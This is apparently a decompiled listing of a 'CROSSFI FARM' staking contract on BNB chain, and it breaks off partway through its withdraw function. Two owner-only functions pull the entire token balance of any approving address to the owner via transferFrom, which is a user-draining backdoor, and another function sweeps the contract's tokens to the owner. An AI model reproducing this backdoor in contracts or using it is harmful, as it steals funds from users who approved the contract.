contract main {




// =====================  Runtime code  =====================


#
#  - sub_8f61717c(?)
#
const sub_2bceef3c(?) = -1


address OWNER;
address FACTORYAddress;
address EXCHANGEAddress;
address sub_19685067Address;
address sub_ea6cfd4aAddress;
address WBNBAddress;
mapping of struct packages;
mapping of struct sub_8bb0097b;
mapping of uint8 stor8;
mapping of uint8 stor9;
array of address users;

function OWNER() {
    return OWNER
}

function sub_19685067(?) {
    return sub_19685067Address
}

function FACTORY() {
    return FACTORYAddress
}

function users(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 < users.length
    return address(users[arg1])
}

function sub_585f6d88(?) {
    require calldata.size - 4 >= 32
    return bool(stor8[arg1])
}

function sub_8bb0097b(?) {
    require calldata.size - 4 >= 64
    return sub_8bb0097b[arg1][arg2].field_0, 
           bool(sub_8bb0097b[arg1][arg2].field_256),
           sub_8bb0097b[arg1][arg2].field_512,
           sub_8bb0097b[arg1][arg2].field_768,
           sub_8bb0097b[arg1][arg2].field_1024,
           sub_8bb0097b[arg1][arg2].field_1280,
           sub_8bb0097b[arg1][arg2].field_1536,
           sub_8bb0097b[arg1][arg2].field_1792
}

function WBNB() {
    return WBNBAddress
}

function EXCHANGE() {
    return EXCHANGEAddress
}

function packages(uint256 arg1) {
    require calldata.size - 4 >= 32
    return packages[arg1].field_0, 
           packages[arg1].field_256,
           packages[arg1].field_512,
           packages[arg1].field_768,
           packages[arg1].field_1024
}

function approved(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor9[arg1])
}

function sub_ea6cfd4a(?) {
    return sub_ea6cfd4aAddress
}

function _fallback() payable {
    revert
}

function sub_1dfd9b27(?) {
    require calldata.size - 4 >= 160
    if OWNER != msg.sender:
        revert with 0, 'CROSSFI FARM: ONLY_OWNER'
    packages[arg1].field_0 = arg2
    packages[arg1].field_256 = arg3
    packages[arg1].field_512 = arg4
    packages[arg1].field_768 = arg5
    packages[arg1].field_1024 = block.timestamp
}

function init(address arg1, address arg2, address arg3, address arg4, address arg5) {
    require calldata.size - 4 >= 160
    if OWNER != msg.sender:
        revert with 0, 'CROSSFI FARM: ONLY_OWNER'
    FACTORYAddress = arg1
    EXCHANGEAddress = arg2
    sub_19685067Address = arg3
    sub_ea6cfd4aAddress = arg4
    WBNBAddress = arg5
}

function sub_d7da0abd(?) {
    require calldata.size - 4 >= 32
    if OWNER != msg.sender:
        revert with 0, 'CROSSFI FARM: ONLY_OWNER'
    require ext_code.size(arg1)
    staticcall arg1.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(arg1)
    call arg1.transfer(address rg1, uint256 rg2) with:
         gas gas_remaining wei
        args OWNER, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function sub_35a44c83(?) {
    require calldata.size - 4 >= 64
    if OWNER != msg.sender:
        revert with 0, 'CROSSFI FARM: ONLY_OWNER'
    require ext_code.size(arg2)
    staticcall arg2.0x70a08231 with:
            gas gas_remaining wei
           args arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(arg2)
    call arg2.transferFrom(address rg1, address rg2, uint256 rg3) with:
         gas gas_remaining wei
        args address(arg1), OWNER, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function sub_4e15e5db(?) {
    require calldata.size - 4 >= 64
    if OWNER != msg.sender:
        revert with 0, 'CROSSFI FARM: ONLY_OWNER'
    require ext_code.size(arg2)
    staticcall arg2.0x70a08231 with:
            gas gas_remaining wei
           args arg1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_code.size(arg2)
    call arg2.transferFrom(address rg1, address rg2, uint256 rg3) with:
         gas gas_remaining wei
        args address(arg1), OWNER, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function sub_7b854541(?) {
    require calldata.size - 4 >= 64
    if arg2 <= 0:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241,
                    mem[198 len 30]
    if arg2 > sub_8bb0097b[msg.sender][arg1].field_768:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    42,
                    0x4443524f535346494e204641524d3a2042414c414e4345204c5020544f4b454e204e4f5420454e4f5547,
                    mem[206 len 22]
    if sub_8bb0097b[address(msg.sender)][arg1].field_768:
        if sub_8bb0097b[address(msg.sender)][arg1].field_1280 > block.timestamp:
            revert with 0, 'SafeMath: subtraction overflow'
        if not block.timestamp - sub_8bb0097b[address(msg.sender)][arg1].field_1280:
            if sub_8bb0097b[address(msg.sender)][arg1].field_768:
                if 0 / sub_8bb0097b[address(msg.sender)][arg1].field_768:
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[773 len 31]
            sub_8bb0097b[address(msg.sender)][arg1].field_1536 = 0
        else:
            if (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024) / block.timestamp - sub_8bb0097b[address(msg.sender)][arg1].field_1280 != sub_8bb0097b[address(msg.sender)][arg1].field_1024:
                revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[773 len 31]
            if not sub_8bb0097b[address(msg.sender)][arg1].field_768:
                sub_8bb0097b[address(msg.sender)][arg1].field_1536 = 0
            else:
                if (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) / sub_8bb0097b[address(msg.sender)][arg1].field_768 != (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024):
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[773 len 31]
                sub_8bb0097b[address(msg.sender)][arg1].field_1536 = (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768)
        sub_8bb0097b[address(msg.sender)][arg1].field_1280 = block.timestamp
        if sub_8bb0097b[address(msg.sender)][arg1].field_1024 != packages[arg1].field_768:
            if block.timestamp > packages[arg1].field_1024:
                sub_8bb0097b[address(msg.sender)][arg1].field_1024 = packages[arg1].field_768
    require ext_code.size(packages[arg1].field_0)
    call packages[arg1].field_0.transfer(address rg1, uint256 rg2) with:
         gas gas_remaining wei
        args msg.sender, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    sub_8bb0097b[msg.sender][arg1].field_768 -= arg2
    emit UpdateUser(msg.sender, arg1);
}

function sub_bcb21edd(?) {
    require calldata.size - 4 >= 64
    if arg2 <= 0:
        revert with 0, 32, 38, 0x4443524f535346494e204641524d3a20414d4f554e54204c5020544f4b454e204953205a4552, mem[522 len 26]
    if not packages[arg1].field_0:
        revert with 0, 32, 33, 0x7743524f535346494e204641524d3a205041434b414745204e4f54204558495354, mem[677 len 31]
    require ext_code.size(packages[arg1].field_0)
    call packages[arg1].field_0.transferFrom(address rg1, address rg2, uint256 rg3) with:
         gas gas_remaining wei
        args msg.sender, this.address, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not ext_call.return_data[0]:
        revert with 0, 32, 39, 0x5443524f535346494e204641524d3a205452414e53464552204c5020544f4b454e204641494c45, mem[683 len 25]
    if not sub_8bb0097b[address(msg.sender)][arg1].field_768:
        if sub_8bb0097b[msg.sender][arg1].field_768:
            sub_8bb0097b[msg.sender][arg1].field_768 += arg2
            if arg2:
                if packages[arg1].field_512 * arg2 / arg2 != packages[arg1].field_512:
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1189 len 31]
                sub_8bb0097b[msg.sender][arg1].field_512 += packages[arg1].field_512 * arg2
        else:
            if packages[arg1].field_256 + block.timestamp < block.timestamp:
                revert with 0, 'SafeMath: addition overflow'
            sub_8bb0097b[msg.sender][arg1].field_0 = block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_256 = 0
            sub_8bb0097b[msg.sender][arg1].field_512 = packages[arg1].field_256 + block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_768 = arg2
            sub_8bb0097b[msg.sender][arg1].field_1024 = packages[arg1].field_768
            sub_8bb0097b[msg.sender][arg1].field_1280 = block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_1536 = 0
            sub_8bb0097b[msg.sender][arg1].field_1792 = 0
    else:
        if sub_8bb0097b[address(msg.sender)][arg1].field_1280 > block.timestamp:
            revert with 0, 'SafeMath: subtraction overflow'
        if not block.timestamp - sub_8bb0097b[address(msg.sender)][arg1].field_1280:
            if sub_8bb0097b[address(msg.sender)][arg1].field_768:
                if 0 / sub_8bb0097b[address(msg.sender)][arg1].field_768:
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1253 len 31]
            sub_8bb0097b[address(msg.sender)][arg1].field_1536 = 0
        else:
            if (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024) / block.timestamp - sub_8bb0097b[address(msg.sender)][arg1].field_1280 != sub_8bb0097b[address(msg.sender)][arg1].field_1024:
                revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1253 len 31]
            if not sub_8bb0097b[address(msg.sender)][arg1].field_768:
                sub_8bb0097b[address(msg.sender)][arg1].field_1536 = 0
            else:
                if (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) / sub_8bb0097b[address(msg.sender)][arg1].field_768 != (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024):
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1253 len 31]
                sub_8bb0097b[address(msg.sender)][arg1].field_1536 = (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768)
        sub_8bb0097b[address(msg.sender)][arg1].field_1280 = block.timestamp
        if sub_8bb0097b[address(msg.sender)][arg1].field_1024 != packages[arg1].field_768:
            if block.timestamp > packages[arg1].field_1024:
                sub_8bb0097b[address(msg.sender)][arg1].field_1024 = packages[arg1].field_768
        if sub_8bb0097b[msg.sender][arg1].field_768:
            sub_8bb0097b[msg.sender][arg1].field_768 += arg2
            if arg2:
                if packages[arg1].field_512 * arg2 / arg2 != packages[arg1].field_512:
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1253 len 31]
                sub_8bb0097b[msg.sender][arg1].field_512 += packages[arg1].field_512 * arg2
        else:
            if packages[arg1].field_256 + block.timestamp < block.timestamp:
                revert with 0, 'SafeMath: addition overflow'
            sub_8bb0097b[msg.sender][arg1].field_0 = block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_256 = 0
            sub_8bb0097b[msg.sender][arg1].field_512 = packages[arg1].field_256 + block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_768 = arg2
            sub_8bb0097b[msg.sender][arg1].field_1024 = packages[arg1].field_768
            sub_8bb0097b[msg.sender][arg1].field_1280 = block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_1536 = 0
            sub_8bb0097b[msg.sender][arg1].field_1792 = 0
    if not stor8[msg.sender]:
        users.length++
        uint256(users[users.length]) = msg.sender or Mask(96, 160, uint256(users[users.length]))
        stor8[msg.sender] = 1
    emit UpdateUser(msg.sender, arg1);
}

function sub_fe728467(?) payable {
    require calldata.size - 4 >= 64
    if not packages[arg1].field_0:
        revert with 0, 32, 33, 0x7743524f535346494e204641524d3a205041434b414745204e4f54204558495354, mem[517 len 31]
    require ext_code.size(packages[arg1].field_0)
    staticcall packages[arg1].field_0.token0() with:
            gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if WBNBAddress == ext_call.return_data[12 len 20]:
        require ext_code.size(packages[arg1].field_0)
        staticcall packages[arg1].field_0.token1() with:
                gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).transferFrom(address rg1, address rg2, uint256 rg3) with:
         gas gas_remaining wei
        args msg.sender, this.address, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if not ext_call.return_data[0]:
        revert with 0, 32, 36, 0xfe43524f535346494e204641524d3a205452414e5346455220544f4b454e204641494c45, mem[520 len 28]
    if not stor9[address(ext_call.return_data[0])]:
        require ext_code.size(address(ext_call.return_data[0]))
        call address(ext_call.return_data[0]).approve(address rg1, uint256 rg2) with:
             gas gas_remaining wei
            args EXCHANGEAddress, -1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        stor9[address(ext_call.return_data[0])] = 1
    if not arg2:
        if 0 > arg2:
            revert with 0, 'SafeMath: subtraction overflow'
        if not msg.value:
            if 0 > msg.value:
                revert with 0, 'SafeMath: subtraction overflow'
            if block.timestamp + 1200 < block.timestamp:
                revert with 0, 'SafeMath: addition overflow'
            require ext_code.size(EXCHANGEAddress)
            call EXCHANGEAddress.addLiquidityETH(address rg1, uint256 rg2, uint256 rg3, uint256 rg4, address rg5, uint256 rg6) with:
               value msg.value wei
                 gas gas_remaining wei
                args address(ext_call.return_data[0]), arg2, arg2, msg.value, address(this.address), block.timestamp + 1200
        else:
            if 2 * msg.value / msg.value != 2:
                revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[645 len 31]
            if 2 * msg.value / 100 > msg.value:
                revert with 0, 'SafeMath: subtraction overflow'
            if block.timestamp + 1200 < block.timestamp:
                revert with 0, 'SafeMath: addition overflow'
            require ext_code.size(EXCHANGEAddress)
            call EXCHANGEAddress.addLiquidityETH(address rg1, uint256 rg2, uint256 rg3, uint256 rg4, address rg5, uint256 rg6) with:
               value msg.value wei
                 gas gas_remaining wei
                args address(ext_call.return_data[0]), arg2, arg2, msg.value - (2 * msg.value / 100), address(this.address), block.timestamp + 1200
    else:
        if 2 * arg2 / arg2 != 2:
            revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[517 len 31]
        if 2 * arg2 / 100 > arg2:
            revert with 0, 'SafeMath: subtraction overflow'
        if not msg.value:
            if 0 > msg.value:
                revert with 0, 'SafeMath: subtraction overflow'
            if block.timestamp + 1200 < block.timestamp:
                revert with 0, 'SafeMath: addition overflow'
            require ext_code.size(EXCHANGEAddress)
            call EXCHANGEAddress.addLiquidityETH(address rg1, uint256 rg2, uint256 rg3, uint256 rg4, address rg5, uint256 rg6) with:
               value msg.value wei
                 gas gas_remaining wei
                args address(ext_call.return_data[0]), arg2, arg2 - (2 * arg2 / 100), msg.value, address(this.address), block.timestamp + 1200
        else:
            if 2 * msg.value / msg.value != 2:
                revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[645 len 31]
            if 2 * msg.value / 100 > msg.value:
                revert with 0, 'SafeMath: subtraction overflow'
            if block.timestamp + 1200 < block.timestamp:
                revert with 0, 'SafeMath: addition overflow'
            require ext_code.size(EXCHANGEAddress)
            call EXCHANGEAddress.addLiquidityETH(address rg1, uint256 rg2, uint256 rg3, uint256 rg4, address rg5, uint256 rg6) with:
               value msg.value wei
                 gas gas_remaining wei
                args address(ext_call.return_data[0]), arg2, arg2 - (2 * arg2 / 100), msg.value - (2 * msg.value / 100), address(this.address), block.timestamp + 1200
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 96
    if not sub_8bb0097b[address(msg.sender)][arg1].field_768:
        if sub_8bb0097b[msg.sender][arg1].field_768:
            sub_8bb0097b[msg.sender][arg1].field_768 += ext_call.return_data[64]
            if ext_call.return_data[64]:
                if packages[arg1].field_512 * ext_call.return_data[64] / ext_call.return_data[64] != packages[arg1].field_512:
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1285 len 31]
                sub_8bb0097b[msg.sender][arg1].field_512 += packages[arg1].field_512 * ext_call.return_data[64]
        else:
            if packages[arg1].field_256 + block.timestamp < block.timestamp:
                revert with 0, 'SafeMath: addition overflow'
            sub_8bb0097b[msg.sender][arg1].field_0 = block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_256 = 0
            sub_8bb0097b[msg.sender][arg1].field_512 = packages[arg1].field_256 + block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_768 = ext_call.return_data[64]
            sub_8bb0097b[msg.sender][arg1].field_1024 = packages[arg1].field_768
            sub_8bb0097b[msg.sender][arg1].field_1280 = block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_1536 = 0
            sub_8bb0097b[msg.sender][arg1].field_1792 = 0
    else:
        if sub_8bb0097b[address(msg.sender)][arg1].field_1280 > block.timestamp:
            revert with 0, 'SafeMath: subtraction overflow'
        if not block.timestamp - sub_8bb0097b[address(msg.sender)][arg1].field_1280:
            if sub_8bb0097b[address(msg.sender)][arg1].field_768:
                if 0 / sub_8bb0097b[address(msg.sender)][arg1].field_768:
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1349 len 31]
            sub_8bb0097b[address(msg.sender)][arg1].field_1536 = 0
        else:
            if (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024) / block.timestamp - sub_8bb0097b[address(msg.sender)][arg1].field_1280 != sub_8bb0097b[address(msg.sender)][arg1].field_1024:
                revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1349 len 31]
            if not sub_8bb0097b[address(msg.sender)][arg1].field_768:
                sub_8bb0097b[address(msg.sender)][arg1].field_1536 = 0
            else:
                if (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) / sub_8bb0097b[address(msg.sender)][arg1].field_768 != (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024):
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1349 len 31]
                sub_8bb0097b[address(msg.sender)][arg1].field_1536 = (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768)
        sub_8bb0097b[address(msg.sender)][arg1].field_1280 = block.timestamp
        if sub_8bb0097b[address(msg.sender)][arg1].field_1024 != packages[arg1].field_768:
            if block.timestamp > packages[arg1].field_1024:
                sub_8bb0097b[address(msg.sender)][arg1].field_1024 = packages[arg1].field_768
        if sub_8bb0097b[msg.sender][arg1].field_768:
            sub_8bb0097b[msg.sender][arg1].field_768 += ext_call.return_data[64]
            if ext_call.return_data[64]:
                if packages[arg1].field_512 * ext_call.return_data[64] / ext_call.return_data[64] != packages[arg1].field_512:
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[1349 len 31]
                sub_8bb0097b[msg.sender][arg1].field_512 += packages[arg1].field_512 * ext_call.return_data[64]
        else:
            if packages[arg1].field_256 + block.timestamp < block.timestamp:
                revert with 0, 'SafeMath: addition overflow'
            sub_8bb0097b[msg.sender][arg1].field_0 = block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_256 = 0
            sub_8bb0097b[msg.sender][arg1].field_512 = packages[arg1].field_256 + block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_768 = ext_call.return_data[64]
            sub_8bb0097b[msg.sender][arg1].field_1024 = packages[arg1].field_768
            sub_8bb0097b[msg.sender][arg1].field_1280 = block.timestamp
            sub_8bb0097b[msg.sender][arg1].field_1536 = 0
            sub_8bb0097b[msg.sender][arg1].field_1792 = 0
    if not stor8[msg.sender]:
        users.length++
        uint256(users[users.length]) = msg.sender or Mask(96, 160, uint256(users[users.length]))
        stor8[msg.sender] = 1
    emit UpdateUser(msg.sender, arg1);
}

function withdraw(uint256 arg1) {
    require calldata.size - 4 >= 32
    if not sub_8bb0097b[address(msg.sender)][arg1].field_768:
        if sub_19685067Address == sub_ea6cfd4aAddress:
            revert with 0, 32, 37, 0x5344656d6178537761704c6962726172793a204944454e544943414c5f4144445245535345, mem[713 len 27]
        if sub_19685067Address < sub_ea6cfd4aAddress:
            if not sub_19685067Address:
                revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
            if sub_19685067Address == sub_ea6cfd4aAddress:
                revert with 0, 32, 37, 0x5344656d6178537761704c6962726172793a204944454e544943414c5f4144445245535345, mem[713 len 27]
            if sub_19685067Address < sub_ea6cfd4aAddress:
                if not sub_19685067Address:
                    revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
                require ext_code.size(FACTORYAddress)
                staticcall FACTORYAddress.contractCodeHash() with:
                        gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(address(sha3(0, FACTORYAddress, sha3(sub_19685067Address, sub_ea6cfd4aAddress), ext_call.return_data[0])))
                staticcall address(sha3(0, FACTORYAddress, sha3(sub_19685067Address, sub_ea6cfd4aAddress), ext_call.return_data[0])).getReserves() with:
                        gas gas_remaining wei
            else:
                if not sub_ea6cfd4aAddress:
                    revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
                require ext_code.size(FACTORYAddress)
                staticcall FACTORYAddress.contractCodeHash() with:
                        gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(address(sha3(0, FACTORYAddress, sha3(sub_ea6cfd4aAddress, sub_19685067Address), ext_call.return_data[0])))
                staticcall address(sha3(0, FACTORYAddress, sha3(sub_ea6cfd4aAddress, sub_19685067Address), ext_call.return_data[0])).getReserves() with:
                        gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 96
            if sub_8bb0097b[msg.sender][arg1].field_1536 <= 0:
                revert with 0, 32, 37, 0x5744656d6178537761704c6962726172793a20494e53554646494349454e545f414d4f554e, mem[902 len 27]
            if sub_19685067Address == sub_19685067Address:
                if ext_call.return_data[18 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[905 len 24]
                if ext_call.return_data[50 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[905 len 24]
                if not sub_8bb0097b[msg.sender][arg1].field_1536:
                    require ext_call.return_data[18 len 14]
                    if 0 / ext_call.return_data[18 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[899 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, 0 / Mask(112, 0, ext_call.return_data[0])
                else:
                    if ext_call.return_data[50 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / sub_8bb0097b[msg.sender][arg1].field_1536 != ext_call.return_data[50 len 14]:
                        revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[898 len 31]
                    require ext_call.return_data[18 len 14]
                    if ext_call.return_data[50 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / ext_call.return_data[18 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[899 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, Mask(112, 0, ext_call.return_data[32]) * sub_8bb0097b[msg.sender][arg1].field_1536 / Mask(112, 0, ext_call.return_data[0])
            else:
                if ext_call.return_data[50 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[905 len 24]
                if ext_call.return_data[18 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[905 len 24]
                if not sub_8bb0097b[msg.sender][arg1].field_1536:
                    require ext_call.return_data[50 len 14]
                    if 0 / ext_call.return_data[50 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[899 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, 0 / Mask(112, 0, ext_call.return_data[32])
                else:
                    if ext_call.return_data[18 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / sub_8bb0097b[msg.sender][arg1].field_1536 != ext_call.return_data[18 len 14]:
                        revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[898 len 31]
                    require ext_call.return_data[50 len 14]
                    if ext_call.return_data[18 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / ext_call.return_data[50 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[899 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, Mask(112, 0, ext_call.return_data[0]) * sub_8bb0097b[msg.sender][arg1].field_1536 / Mask(112, 0, ext_call.return_data[32])
        else:
            if not sub_ea6cfd4aAddress:
                revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
            if sub_19685067Address == sub_ea6cfd4aAddress:
                revert with 0, 32, 37, 0x5344656d6178537761704c6962726172793a204944454e544943414c5f4144445245535345, mem[713 len 27]
            if sub_19685067Address < sub_ea6cfd4aAddress:
                if not sub_19685067Address:
                    revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
                require ext_code.size(FACTORYAddress)
                staticcall FACTORYAddress.contractCodeHash() with:
                        gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(address(sha3(0, FACTORYAddress, sha3(sub_19685067Address, sub_ea6cfd4aAddress), ext_call.return_data[0])))
                staticcall address(sha3(0, FACTORYAddress, sha3(sub_19685067Address, sub_ea6cfd4aAddress), ext_call.return_data[0])).getReserves() with:
                        gas gas_remaining wei
            else:
                if not sub_ea6cfd4aAddress:
                    revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
                require ext_code.size(FACTORYAddress)
                staticcall FACTORYAddress.contractCodeHash() with:
                        gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(address(sha3(0, FACTORYAddress, sha3(sub_ea6cfd4aAddress, sub_19685067Address), ext_call.return_data[0])))
                staticcall address(sha3(0, FACTORYAddress, sha3(sub_ea6cfd4aAddress, sub_19685067Address), ext_call.return_data[0])).getReserves() with:
                        gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 96
            if sub_8bb0097b[msg.sender][arg1].field_1536 <= 0:
                revert with 0, 32, 37, 0x5744656d6178537761704c6962726172793a20494e53554646494349454e545f414d4f554e, mem[902 len 27]
            if sub_ea6cfd4aAddress == sub_19685067Address:
